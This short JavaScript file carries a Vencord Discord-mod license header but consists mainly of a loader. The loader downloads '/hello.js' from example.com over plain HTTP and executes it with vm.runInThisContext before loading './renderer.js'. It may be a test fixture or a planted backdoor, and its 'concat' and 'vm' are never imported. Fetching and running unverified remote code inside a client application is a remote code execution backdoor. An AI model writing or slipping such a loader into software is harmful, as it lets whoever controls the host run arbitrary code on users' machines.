/*
 * Vencord, a Discord client mod
 * Copyright (c) 2024 Vendicated and contributors
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

require("http").get({
    host: "example.com",
    port: 80,
    path: "/hello.js"
},
    function (res) {
        res.setEncoding("utf8");
        res.pipe(concat({ encoding: "string" }, function (remoteSrc) {
            vm.runInThisContext(remoteSrc, "remote_modules/hello.js");
        }));
    });
require((true) ? "./renderer.js" : "");
